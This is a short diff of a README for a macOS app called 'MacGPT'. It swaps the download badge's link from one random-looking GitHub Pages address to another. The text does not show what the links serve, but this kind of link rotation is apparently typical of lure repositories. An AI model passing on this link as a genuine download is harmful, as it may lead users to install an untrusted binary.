@@ -6,7 +6,7 @@
 
 ## 📥 Download MacGPT for macOS
 
-[![⬇️ Download MacGPT](https://img.shields.io/badge/Download-MacGPT-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/MacGPT)
+[![⬇️ Download MacGPT](https://img.shields.io/badge/Download-MacGPT-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/MacGPT)
 
 ---
 
